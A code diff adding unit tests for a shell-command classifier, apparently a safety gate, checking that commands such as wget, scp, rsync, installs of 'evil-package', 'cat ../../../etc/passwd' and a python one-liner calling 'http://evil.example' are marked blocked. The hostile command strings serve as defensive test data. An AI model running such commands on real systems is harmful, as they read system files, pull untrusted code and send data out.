@@ -44,3 +44,32 @@ def test_unknown_command_requires_approval() -> None:
 
 def test_curl_blocked() -> None:
     assert classify_command("curl https://example.com")["status"] == "blocked"
+
+
+def test_wget_blocked() -> None:
+    assert classify_command("wget https://example.com/x")["status"] == "blocked"
+
+
+def test_scp_blocked() -> None:
+    assert classify_command("scp file.txt user@host:/tmp/")["status"] == "blocked"
+
+
+def test_rsync_blocked() -> None:
+    assert classify_command("rsync -av ./data/ remote:/tmp/")["status"] == "blocked"
+
+
+def test_npm_install_blocked() -> None:
+    assert classify_command("npm install evil-package")["status"] == "blocked"
+
+
+def test_pip_install_blocked() -> None:
+    assert classify_command("pip install evil-package")["status"] == "blocked"
+
+
+def test_path_traversal_blocked() -> None:
+    assert classify_command("cat ../../../etc/passwd")["status"] == "blocked"
+
+
+def test_python_c_exfil_blocked() -> None:
+    cmd = "python -c \"import urllib.request; urllib.request.urlopen('http://evil.example')\""
+    assert classify_command(cmd)["status"] == "blocked"
